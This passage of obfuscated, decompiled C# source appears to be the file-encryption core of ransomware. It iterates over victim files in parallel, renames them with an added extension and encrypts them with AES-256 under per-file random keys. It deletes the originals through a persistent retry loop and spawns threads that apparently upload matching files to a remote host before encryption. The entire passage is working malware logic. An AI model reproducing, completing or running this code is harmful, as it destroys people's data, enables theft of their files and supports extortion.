									File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + item + YUIjdATTEVIX.getString_0(107402865) + ex18.Message + YUIjdATTEVIX.getString_0(107396257));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex20)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + item + YUIjdATTEVIX.getString_0(107402816) + ex20.Message + YUIjdATTEVIX.getString_0(107396257));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								goto end_IL_02cd_2;
							}
							if (!(CdQMIPJOkrOUDSy == YUIjdATTEVIX.getString_0(107396856)) || new FileInfo(item).Length <= Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 || CS_0024_003C_003E8__locals0.ZfHQdOmNHVP.Contains(string_0))
							{
								if (MiZHZrKmtKkaPXn)
								{
									CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
								}
								string text3 = mceVbtNuaiZN.aqouYfCyYVRJ(32);
								string s3 = fFCYpdPapHY.lDIEEniZHqoT(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
								{
									if (!EcdpqbMrQOzfdgL)
									{
										if (!IooTTsvIiwCN)
										{
											ruDoXmaKIFHJl(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
										}
										else
										{
											ruDoXmaKIFHJl(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!IooTTsvIiwCN)
											{
												NjEZcsaMnUwQ(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
											}
											else
											{
												NjEZcsaMnUwQ(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (joesCNAxeHUI)
											{
												try
												{
													File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + item + YUIjdATTEVIX.getString_0(107385809) + ex22.Message + YUIjdATTEVIX.getString_0(107396257));
												}
												catch (Exception)
												{
												}
											}
											iePhSHBTqLd++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!EcdpqbMrQOzfdgL)
								{
									if (!IooTTsvIiwCN)
									{
										ruDoXmaKIFHJl(item, item + YUIjdATTEVIX.getString_0(107385850), lrVhqMPbYlaOK);
									}
									else
									{
										ruDoXmaKIFHJl(item, item + YUIjdATTEVIX.getString_0(107385850), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!IooTTsvIiwCN)
										{
											NjEZcsaMnUwQ(item, item, lrVhqMPbYlaOK);
										}
										else
										{
											NjEZcsaMnUwQ(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (joesCNAxeHUI)
										{
											try
											{
												File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + item + YUIjdATTEVIX.getString_0(107385809) + ex25.Message + YUIjdATTEVIX.getString_0(107396257));
											}
											catch (Exception)
											{
											}
										}
										iePhSHBTqLd++;
										goto end_IL_02cd_2;
									}
								}
								if (IooTTsvIiwCN)
								{
									if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
									{
										ixTFoaDRJMY(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, bytes3);
									}
									else
									{
										ixTFoaDRJMY(item, bytes3);
									}
								}
								goto IL_09e1;
							}
							CS_0024_003C_003E8__locals0 = new YUIjdATTEVIX.FjPMVmyEERNReE();
							CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
								{
									if (MiZHZrKmtKkaPXn)
									{
										CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd);
								}
							}
							catch (Exception ex27)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + item + YUIjdATTEVIX.getString_0(107402755) + ex27.Message + YUIjdATTEVIX.getString_0(107396257));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = YUIjdATTEVIX.getString_0(107388575);
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
							{
								CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
							}
							else
							{
								CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item;
							}
							if (bxhZXFvKXZl == YUIjdATTEVIX.getString_0(107396856))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in EKjYgfCTgvyfhvOPx)
									{
										if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg.ZDxRrpKTbd) && vEWBFQaTPDgk == YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107396859))
										{
											if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX).Length)
											{
												try
												{
													LRKYNOUdGHN.qatkvmOGuIr(YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107388627), YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107388622), YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107388641), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2) && vEWBFQaTPDgk == YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107397019))
										{
											try
											{
												LRKYNOUdGHN.qatkvmOGuIr(YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107388627), YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107388622), YUIjdATTEVIX.FjPMVmyEERNReE.getString_0(107388641), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = mceVbtNuaiZN.aqouYfCyYVRJ(32);
							string s4 = fFCYpdPapHY.lDIEEniZHqoT(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (QGAYpwMzxm == YUIjdATTEVIX.getString_0(107397016))
							{
								byte[] array2 = null;
								byte[] byte_2 = RgELsEgHUCW.yawJYYjGarh(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
								if (RgELsEgHUCW.UWMgjLGhgbOURXn(kSmujIomiIqp: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? RgELsEgHUCW.eUGEbOMOKENsBL(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RgELsEgHUCW.eUGEbOMOKENsBL(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), VBvOCDljtLw: CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, dJYcPbfWMdc: bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!IooTTsvIiwCN)
							{
								if (sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, text4, bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09e1;
						}
					}
					continue;
					IL_09e1:
					CS_0024_003C_003E8__locals0.WNvdcTPDgW.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.WNvdcTPDgW, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new YUIjdATTEVIX.dAvOkiJbjzoXh();
			CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.PUDDzPYRoE = string_0;
			if (CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW.Length != 0)
			{
				string[] dXgeOiXUaNyFEW = CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW;
				int num = 0;
				while (num < dXgeOiXUaNyFEW.Length)
				{
					string value = dXgeOiXUaNyFEW[num];
					if (!CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(CS_0024_003C_003E8__locals0.ZDxRrpKTbd))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!yGkMwQPqUdXIj.Contains(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
			{
				if (cySCSfjuDKIn == YUIjdATTEVIX.getString_0(107396856))
				{
					try
					{
						if (femjyBXnUNA.ngUKfMrzBNU(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
						{
							femjyBXnUNA.rVIDVvPdlEIDhn(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE));
				}
				opWbnDRtWCXNbKkM(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				try
				{
					new CQyeXvaAck().qKRkxhexZuqHsOh(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.PUDDzPYRoE, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(YUIjdATTEVIX.getString_0(107402600) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107402587) + new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length + YUIjdATTEVIX.getString_0(107402534));
								Console.WriteLine(YUIjdATTEVIX.getString_0(107402557));
							}
						}
						catch
						{
						}
						tLMiMedPBjRN(PhXjLAIdTCy(YUIjdATTEVIX.getString_0(107402420)), YUIjdATTEVIX.getString_0(107387558) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107387558) + PhXjLAIdTCy(YUIjdATTEVIX.getString_0(107402427)) + YUIjdATTEVIX.getString_0(107387558) + Environment.UserName + YUIjdATTEVIX.getString_0(107387558) + PhXjLAIdTCy(YUIjdATTEVIX.getString_0(107402378)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107402865) + ex2.Message + YUIjdATTEVIX.getString_0(107396257));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107402816) + ex4.Message + YUIjdATTEVIX.getString_0(107396257));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_031d_2;
					}
					if (CdQMIPJOkrOUDSy == YUIjdATTEVIX.getString_0(107396856) && new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
							{
								if (MiZHZrKmtKkaPXn)
								{
									CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
								}
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107402755) + ex6.Message + YUIjdATTEVIX.getString_0(107396257));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
						{
							CS_0024_003C_003E8__locals0.PUDDzPYRoE += CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
						}
						if (bxhZXFvKXZl == YUIjdATTEVIX.getString_0(107396856))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg.ZDxRrpKTbd) && vEWBFQaTPDgk == YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107396862))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length)
										{
											try
											{
												LRKYNOUdGHN.qatkvmOGuIr(YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107388630), YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107388625), YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107388644), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item3) && vEWBFQaTPDgk == YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107397022))
									{
										try
										{
											LRKYNOUdGHN.qatkvmOGuIr(YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107388630), YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107388625), YUIjdATTEVIX.dAvOkiJbjzoXh.getString_0(107388644), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = mceVbtNuaiZN.aqouYfCyYVRJ(32);
						string s = fFCYpdPapHY.lDIEEniZHqoT(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == YUIjdATTEVIX.getString_0(107397016))
						{
							byte[] array = null;
							byte[] byte_ = RgELsEgHUCW.yawJYYjGarh(CS_0024_003C_003E8__locals0.PUDDzPYRoE, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (!RgELsEgHUCW.UWMgjLGhgbOURXn(kSmujIomiIqp: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), VBvOCDljtLw: CS_0024_003C_003E8__locals0.PUDDzPYRoE, dJYcPbfWMdc: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (!sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MiZHZrKmtKkaPXn)
						{
							CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
						}
						string text2 = mceVbtNuaiZN.aqouYfCyYVRJ(32);
						string s2 = fFCYpdPapHY.lDIEEniZHqoT(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
						{
							if (!EcdpqbMrQOzfdgL)
							{
								if (!IooTTsvIiwCN)
								{
									ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IooTTsvIiwCN)
									{
										NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
									}
									else
									{
										NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (joesCNAxeHUI)
									{
										try
										{
											File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107385809) + ex11.Message + YUIjdATTEVIX.getString_0(107396257));
										}
										catch (Exception)
										{
										}
									}
									iePhSHBTqLd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107385850), lrVhqMPbYlaOK);
							}
							else
							{
								ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107385850), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, lrVhqMPbYlaOK);
								}
								else
								{
									NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, YUIjdATTEVIX.getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + YUIjdATTEVIX.getString_0(107385809) + ex14.Message + YUIjdATTEVIX.getString_0(107396257));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								return;
							}
						}
						if (IooTTsvIiwCN)
						{
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != YUIjdATTEVIX.getString_0(107385855))
							{
								ixTFoaDRJMY(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, bytes2);
							}
							else
							{
								ixTFoaDRJMY(CS_0024_003C_003E8__locals0.PUDDzPYRoE, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			CS_0024_003C_003E8__locals0.WNvdcTPDgW.Remove(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
		});
	}

	private static void ooVjxwIPpbkKr(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (bxhZXFvKXZl == getString_0(107396836))
					{
						foreach (string item in EKjYgfCTgvyfhvOPx)
						{
							if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396836))
							{
								if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396996))
							{
								try
								{
									LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107385830)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107385830), getString_0(107388555)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void NjEZcsaMnUwQ(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (bxhZXFvKXZl == getString_0(107396836))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396836))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396996))
					{
						try
						{
							LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = qTvYToAYGfnjeqK.RynnMPMCexwHcK(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		XnicJWCgBOO++;
	}

	private static void ruDoXmaKIFHJl(string string_0, string string_1, byte[] byte_0)
	{
		FCrYAtqwyDP CS_0024_003C_003E8__locals0 = new FCrYAtqwyDP();
		CS_0024_003C_003E8__locals0.atoCyWSfKSy = string_0;
		CS_0024_003C_003E8__locals0.fRxskrnPHhc = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string fRxskrnPHhc = CS_0024_003C_003E8__locals0.fRxskrnPHhc;
			FileStream fileStream = new FileStream(fRxskrnPHhc, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (POXokwFKrkkHxdVH == getString_0(107396836))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
